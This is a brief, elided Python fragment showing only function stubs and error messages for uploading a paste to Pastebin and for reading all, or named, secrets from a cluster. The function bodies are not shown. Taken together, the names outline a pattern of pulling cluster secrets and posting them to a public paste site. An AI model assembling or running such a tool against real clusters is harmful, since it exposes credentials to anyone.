...
def upload_to_pastebin(paste):
    try:
        ...
        print(f"Got exception while uploading paste. Exception: {e}")
...
def get_secrets():
    try:
        ...
        print(f"Got exception while getting all secrets from cluster. Exception: {e}")
...
def get_named_secret(name, namespace):
    try:
        ...
        print(f"Got exception while getting secret from cluster. Exception: {e}")
